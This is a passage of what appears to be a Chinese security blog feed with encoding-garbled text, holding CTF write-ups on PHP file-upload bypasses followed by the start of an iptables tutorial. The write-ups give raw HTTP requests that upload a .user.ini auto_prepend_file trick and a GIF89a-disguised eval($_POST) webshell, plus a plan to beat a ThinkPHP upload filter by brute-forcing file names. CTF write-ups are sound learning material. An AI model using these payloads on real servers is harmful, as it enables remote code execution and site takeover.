language&#x3D;&quot;php&quot;&gt;@ eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ--</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>æŠ€æœ¯ç‚¹ï¼š</p><ul><li>.user.ini æ–‡ä»¶é‡å†™ç»•è¿‡é»‘åå•GetShell</li></ul><p>æŠ€æœ¯æ¦‚è¿°ï¼š</p><p><strong>auto_prepend_file</strong>æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›<strong>auto_append_file</strong>åœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<code>exit()</code>æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP</li><li>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼</li><li>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li></ul><p>æŠ€æœ¯ç‚¹ç»†èŠ‚å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html</a></p><ul><li>æ»¡è¶³æ¡ä»¶ä¸€ï¼šä¸Šä¼ ç›®å½•ä¸‹æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200830225232.png" alt="image-20200830225229206"></p><p>åˆ©ç”¨è¿‡ç¨‹ï¼š</p><p>å…ˆä¸Šä¼ <code>.user.ini</code> æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Length: 336</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;basic_php_webshell.jpg</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">æäº¤</span><br><span class="line">------WebKitFormBoundary6dvjBUhTD4exggyU--</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ WebShellï¼ˆ<strong>éœ€è¦ç»•è¿‡&lt;? å’Œ Content-Type</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Length: 359</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;870fbc35-aa6b-40c3-9ea0-b854574f86a2.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;basic_php_webshell.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">æäº¤</span><br><span class="line">------WebKitFormBoundary8yvecxrZpVYWNxvE--</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123; <span class="comment">// æ£€æµ‹æ–‡ä»¶åç¼€æ˜¯å¦å«æœ‰php</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±»</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span></span><br><span class="line">            $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">            <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Thinkphp çš„å¤šæ–‡ä»¶ä¸Šä¼ (å½“upload()å‡½æ•°ä¸ä¼ å‚æ•°æ—¶,é»˜è®¤ä¸ºå¤šæ–‡ä»¶ä¸Šä¼ ,æ•´ä¸ª$_FILESæ•°ç»„çš„æ–‡ä»¶éƒ½ä¼šè¢«ä¸Šä¼ )</li><li>uniqid è®¾ç½®æ–‡ä»¶è·¯å¾„ä¸åˆç†, å­˜åœ¨å¯çˆ†ç ´çš„å¯èƒ½æ€§</li><li><code>$upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> allowExts æ–¹æ³•ç”¨äºæ£€æµ‹æ–‡ä»¶åå°±æ²¡ç”¨äº†, å› ä¸ºè¿™ç§æƒ…å†µé»˜è®¤åªæ£€æŸ¥ä¸€æ¬¡, è€Œå¤šæ–‡ä»¶ä¸Šä¼ æ—¶å°±ç»•è¿‡äº†æ–‡ä»¶æ£€æµ‹</li></ul><p>æ€è·¯ : </p><ol><li>è·å–æ–‡ä»¶ä¸Šä¼ çš„é»˜è®¤è·¯å¾„</li><li>ä¼ªé€ æ–‡ä»¶ä¸Šä¼ çš„HTTP Request è¯·æ±‚åŒ…</li><li>ä¸Šä¼ å¤šä¸ªæ–‡ä»¶</li><li>å¯¹æ–‡ä»¶åè¿›è¡Œçˆ†ç ´(å› ä¸º<strong>è¿ç»­ä¸Šä¼ çš„æ–‡ä»¶,uniqidå¤„ç†æ˜¯å¾®ç§’çº§åˆ«çš„</strong>,æ‰€ä»¥å·®åˆ«ä¸ä¼šå¤ªå¤§)</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹&quot;&gt;&lt;/a&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;a href=&quot;http://gv7.me/a</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>iptables å­¦ä¹ </title>
    <link href="https://hack-for.fun/13bb2df2.html"/>
    <id>https://hack-for.fun/13bb2df2.html</id>
    <published>2020-08-26T07:17:09.000Z</published>
    <updated>2020-08-26T15:25:09.938Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒèµ„æ–™ï¼š </p><p>(å†…å®¹å’Œå›¾ç‰‡)</p><p>å…¨æ•™ç¨‹ç³»åˆ—</p><p><a href="http://www.zsythink.net/archives/tag/iptables/">iptables å…¥é—¨ç³»åˆ—</a></p><blockquote><p>ä½œä¸ºå®‰å…¨ç‹— ï¼Œè‡ªè®¤ä¸ºçŸ¥é“æ¦‚å¿µå’ŒåŸºç¡€æ“ä½œå°±è¡Œäº†ï¼ˆæå®‰å…¨çš„è¦å­¦çš„ä¸œè¥¿çœŸçš„å¤ªå¤šäº†ã€‚</p></blockquote><p>åŸä½œè€…ä¸€å¼€å§‹è®²äº†é˜²ç«å¢™çš„çŸ¥è¯†ï¼Œç®—ä¸é”™çš„ç§‘æ™®ã€‚</p><h1 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h1><blockquote><p>ä»é€»è¾‘ä¸Šè®²ã€‚é˜²ç«å¢™å¯ä»¥å¤§ä½“åˆ†ä¸ºä¸»æœºé˜²ç«å¢™å’Œç½‘ç»œé˜²ç«å¢™ã€‚</p></blockquote><p>ä¸»æœºé˜²ç«å¢™ï¼šé’ˆå¯¹äºå•ä¸ªä¸»æœºè¿›è¡Œé˜²æŠ¤ã€‚</p><p>ç½‘ç»œé˜²ç«å¢™ï¼šå¾€å¾€å¤„äºç½‘ç»œå…¥å£æˆ–è¾¹ç¼˜ï¼Œé’ˆå¯¹äºç½‘ç»œå…¥å£è¿›è¡Œé˜²æŠ¤ï¼ŒæœåŠ¡äºé˜²ç«å¢™èƒŒåçš„æœ¬åœ°å±€åŸŸç½‘ã€‚</p><p>ç½‘ç»œé˜²ç«å¢™å’Œä¸»æœºé˜²ç«å¢™å¹¶ä¸å†²çªï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œç½‘ç»œé˜²ç«å¢™ä¸»å¤–ï¼ˆé›†ä½“ï¼‰ï¼Œ ä¸»æœºé˜²ç«å¢™ä¸»å†…ï¼ˆä¸ªäººï¼‰ã€‚</p><hr><blockquote><p>ä»ç‰©ç†ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥åˆ†ä¸ºç¡¬ä»¶é˜²ç«å¢™å’Œè½¯ä»¶é˜²ç«å¢™ã€‚</p></blockquote><p>ç¡¬ä»¶é˜²ç«å¢™ï¼šåœ¨ç¡¬ä»¶çº§åˆ«å®ç°éƒ¨åˆ†é˜²ç«å¢™åŠŸèƒ½ï¼Œå¦ä¸€éƒ¨åˆ†åŠŸèƒ½åŸºäºè½¯ä»¶å®ç°ï¼Œæ€§èƒ½é«˜ï¼Œæˆæœ¬é«˜ã€‚</p><p>è½¯ä»¶é˜²ç«å¢™ï¼šåº”ç”¨è½¯ä»¶å¤„ç†é€»è¾‘è¿è¡Œäºé€šç”¨ç¡¬ä»¶å¹³å°ä¹‹ä¸Šçš„é˜²ç«å¢™ï¼Œæ€§èƒ½ä½ï¼Œæˆæœ¬ä½ã€‚</p><p>è€Œæ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸ä¼šé‡è§WAFï¼ŒWeb Application Firewallï¼ˆWeb åº”ç”¨é˜²ç«å¢™ã€‚æ¯”å¦‚é•¿äº­çš„é›·æ± ï¼ˆSafeLineï¼‰ï¼ŒåŸºäºè¯­ä¹‰åˆ†æï¼Œéå¸¸å‰å®³ï¼Œè¦æ˜¯é‡åˆ°äº†å°±åˆ«æƒ³æ€ä¹ˆç»•äº†ï¼ˆÃ—</p><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p><code>iptables</code> åªæœ‰Linux ç³»çš„ç³»ç»Ÿæ‰æœ‰ã€‚</p><p><strong>iptables</strong>å…¶å®ä¸æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ä¸ªå®¢æˆ·ç«¯ä»£ç†ï¼Œç”¨æˆ·é€šè¿‡iptablesè¿™ä¸ªä»£ç†ï¼Œå°†ç”¨æˆ·çš„å®‰å…¨è®¾å®šæ‰§è¡Œåˆ°å¯¹åº”çš„â€å®‰å…¨æ¡†æ¶â€ä¸­ï¼Œè¿™ä¸ªâ€å®‰å…¨æ¡†æ¶â€æ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œè¿™ä¸ªæ¡†æ¶çš„åå­—å«<strong>netfilter</strong></p><p>netfilteræ‰æ˜¯é˜²ç«å¢™çœŸæ­£çš„å®‰å…¨æ¡†æ¶ï¼ˆframeworkï¼‰ï¼Œnetfilterä½äºå†…æ ¸ç©ºé—´ã€‚</p><p>iptableså…¶å®æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œä½äºç”¨æˆ·ç©ºé—´ï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå·¥å…·æ“ä½œçœŸæ­£çš„æ¡†æ¶ã€‚</p><p>netfilter/iptablesï¼ˆä¸‹æ–‡ä¸­ç®€ç§°ä¸ºiptablesï¼‰ç»„æˆLinuxå¹³å°ä¸‹çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ï¼Œä¸å¤§å¤šæ•°çš„Linuxè½¯ä»¶ä¸€æ ·ï¼Œè¿™ä¸ªåŒ…è¿‡æ»¤é˜²ç«å¢™æ˜¯å…è´¹çš„ï¼Œå®ƒå¯ä»¥ä»£æ›¿æ˜‚è´µçš„å•†ä¸šé˜²ç«å¢™è§£å†³æ–¹æ¡ˆï¼Œå®Œæˆ<code>å°åŒ…è¿‡æ»¤</code>ã€<code>å°åŒ…é‡å®šå‘</code>å’Œ<code>ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰</code>ç­‰åŠŸèƒ½ã€‚</p><p>Netfilteræ˜¯Linuxæ“ä½œç³»ç»Ÿæ ¸å¿ƒå±‚å†…éƒ¨çš„ä¸€ä¸ªæ•°æ®åŒ…å¤„ç†æ¨¡å—ï¼Œå®ƒå…·æœ‰å¦‚ä¸‹åŠŸèƒ½ï¼š</p><ul><li><p>ç½‘ç»œåœ°å€è½¬æ¢(Network Address Translate)</p></li><li><p>æ•°æ®åŒ…å†…å®¹ä¿®æ”¹</p></li><li><p>æ•°æ®åŒ…è¿‡æ»¤çš„é˜²ç«å¢™åŠŸèƒ½</p></li></ul><p>æ‰€ä»¥è¯´ï¼Œè™½ç„¶æˆ‘ä»¬ä½¿ç”¨service iptables startå¯åŠ¨iptablesâ€æœåŠ¡â€ï¼Œä½†æ˜¯å…¶å®å‡†ç¡®çš„æ¥è¯´ï¼Œiptableså¹¶<code>æ²¡æœ‰ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹</code>ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ç®—æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æœåŠ¡ï¼Œè€Œåº”è¯¥ç®—æ˜¯<code>å†…æ ¸æä¾›çš„åŠŸèƒ½</code>ã€‚</p><h2 id="Iptables-åŸºç¡€"><a href="#Iptables-åŸºç¡€" class="headerlink" title="Iptables åŸºç¡€"></a>Iptables åŸºç¡€</h2><p>Iptables æ˜¯æŒ‰ç…§â€œè§„åˆ™â€åŠäº‹çš„ï¼Œè§„åˆ™å…¶å®å°±æ˜¯ç½‘ç»œç®¡ç†å‘˜é¢„å®šä¹‰çš„æ¡ä»¶ï¼Œè§„åˆ™ä¸€èˆ¬çš„å®šä¹‰ä¸º<code>&quot;å¦‚æœæ•°æ®åŒ…å¤´ç¬¦åˆè¿™æ ·çš„æ¡ä»¶ï¼Œå°±è¿™æ ·å¤„ç†è¿™ä¸ªæ•°æ®åŒ…&quot;</code>ã€‚</p><blockquote><p>è§„åˆ™å­˜å‚¨åœ¨å†…æ ¸ç©ºé—´çš„ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ä¸­ï¼Œè¿™äº›è§„åˆ™åˆ†åˆ«æŒ‡å®šäº†æºåœ°å€ã€ç›®çš„åœ°å€ã€ä¼ è¾“åè®®ï¼ˆå¦‚TCPã€UDPã€ICMPï¼‰å’ŒæœåŠ¡ç±»å‹ï¼ˆå¦‚HTTPã€FTPå’ŒSMTPï¼‰ç­‰ã€‚å½“æ•°æ®åŒ…ä¸è§„åˆ™åŒ¹é…æ—¶ï¼Œiptableså°±æ ¹æ®è§„åˆ™æ‰€å®šä¹‰çš„æ–¹æ³•æ¥å¤„ç†è¿™äº›æ•°æ®åŒ…ï¼Œå¦‚æ”¾è¡Œï¼ˆacceptï¼‰ã€æ‹’ç»ï¼ˆrejectï¼‰å’Œä¸¢å¼ƒï¼ˆdropï¼‰ç­‰ã€‚é…ç½®é˜²ç«å¢™çš„ä¸»è¦å·¥ä½œå°±æ˜¯æ·»åŠ ã€ä¿®æ”¹å’Œåˆ é™¤è¿™äº›è§„åˆ™ã€‚</p></blockquote><p>å½“å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨çš„webæœåŠ¡æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€æŠ¥æ–‡åˆ°ç½‘å¡ï¼Œè€Œ<strong>tcp/ipåè®®æ ˆæ˜¯å±äºå†…æ ¸çš„ä¸€éƒ¨åˆ†</strong>ï¼Œæ‰€ä»¥ï¼Œå®¢æˆ·ç«¯çš„ä¿¡æ¯ä¼šé€šè¿‡å†…æ ¸çš„TCPåè®®ä¼ è¾“åˆ°ç”¨æˆ·ç©ºé—´ä¸­çš„webæœåŠ¡ä¸­ï¼Œè€Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯æŠ¥æ–‡çš„ç›®æ ‡ç»ˆç‚¹ä¸ºwebæœåŠ¡æ‰€ç›‘å¬çš„å¥—æ¥å­—ï¼ˆIPï¼šPortï¼‰ä¸Šï¼Œå½“webæœåŠ¡éœ€è¦å“åº”å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼ŒwebæœåŠ¡å‘å‡ºçš„å“åº”æŠ¥æ–‡çš„ç›®æ ‡ç»ˆç‚¹åˆ™ä¸ºå®¢æˆ·ç«¯ï¼Œè¿™ä¸ªæ—¶å€™ï¼ŒwebæœåŠ¡æ‰€ç›‘å¬çš„IPä¸ç«¯å£åè€Œå˜æˆäº†åŸç‚¹ï¼Œæˆ‘ä»¬è¯´è¿‡ï¼Œnetfilteræ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œå®ƒæ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é˜²ç«å¢™èƒ½å¤Ÿè¾¾åˆ°â€é˜²ç«â€çš„ç›®çš„ï¼Œåˆ™éœ€è¦åœ¨å†…æ ¸ä¸­è®¾ç½®å…³å¡ï¼Œæ‰€æœ‰è¿›å‡ºçš„æŠ¥æ–‡éƒ½è¦é€šè¿‡è¿™äº›å…³å¡ï¼Œç»è¿‡æ£€æŸ¥åï¼Œç¬¦åˆæ”¾è¡Œæ¡ä»¶çš„æ‰èƒ½æ”¾è¡Œï¼Œç¬¦åˆé˜»æ‹¦æ¡ä»¶çš„åˆ™éœ€è¦è¢«é˜»æ­¢ï¼Œäºæ˜¯ï¼Œå°±å‡ºç°äº†inputå…³å¡å’Œoutputå…³å¡ï¼Œ<strong>è€Œè¿™äº›å…³å¡åœ¨iptablesä¸­ä¸è¢«ç§°ä¸ºâ€å…³å¡â€,è€Œè¢«ç§°ä¸ºâ€é“¾â€ã€‚</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_1.png"></p><p>ä¸Šé¢æè¿°çš„åœºæ™¯å¹¶ä¸å®Œå–„ï¼Œå› ä¸º<strong>å®¢æˆ·ç«¯å‘æ¥çš„æŠ¥æ–‡è®¿é—®çš„ç›®æ ‡åœ°å€å¯èƒ½å¹¶ä¸æ˜¯æœ¬æœºï¼Œè€Œæ˜¯å…¶ä»–æœåŠ¡å™¨ï¼Œå½“æœ¬æœºçš„å†…æ ¸æ”¯æŒIP_FORWARDæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŠ¥æ–‡è½¬å‘ç»™å…¶ä»–æœåŠ¡å™¨</strong>ï¼Œæ‰€ä»¥ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šæåˆ°iptablesä¸­çš„å…¶ä»–â€å…³å¡â€ï¼Œä¹Ÿå°±æ˜¯å…¶ä»–â€é“¾â€ï¼Œä»–ä»¬å°±æ˜¯  â€œè·¯ç”±å‰â€ã€â€è½¬å‘â€ã€â€è·¯ç”±åâ€ï¼Œä»–ä»¬çš„è‹±æ–‡åæ˜¯</p><p>PREROUTINGã€FORWARDã€POSTROUTING</p><p>æ ¹æ®å®é™…æƒ…å†µçš„ä¸åŒï¼ŒæŠ¥æ–‡ç»è¿‡â€é“¾â€å¯èƒ½ä¸åŒã€‚<strong>å¦‚æœæŠ¥æ–‡éœ€è¦è½¬å‘ï¼Œé‚£ä¹ˆæŠ¥æ–‡åˆ™ä¸ä¼šç»è¿‡inputé“¾å‘å¾€ç”¨æˆ·ç©ºé—´ï¼Œè€Œæ˜¯ç›´æ¥åœ¨å†…æ ¸ç©ºé—´ä¸­ç»è¿‡forwardé“¾å’Œpostroutingé“¾è½¬å‘å‡ºå»çš„ã€‚</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png"></p><p>å¸¸è§åœºæ™¯ä¸­æŠ¥æ–‡çš„æµå‘ï¼š</p><ul><li><p>åˆ°æœ¬æœºæŸè¿›ç¨‹çš„æŠ¥æ–‡ï¼šPREROUTING â€“&gt; INPUT</p></li><li><p>ç”±æœ¬æœºè½¬å‘çš„æŠ¥æ–‡ï¼šPREROUTING â€“&gt; FORWARD â€“&gt; POSTROUTING</p></li><li><p>ç”±æœ¬æœºçš„æŸè¿›ç¨‹å‘å‡ºæŠ¥æ–‡ï¼ˆé€šå¸¸ä¸ºå“åº”æŠ¥æ–‡ï¼‰ï¼šOUTPUT â€“&gt; POSTROUTING</p></li></ul><h2 id="é“¾çš„æ¦‚å¿µ"><a href="#é“¾çš„æ¦‚å¿µ" class="headerlink" 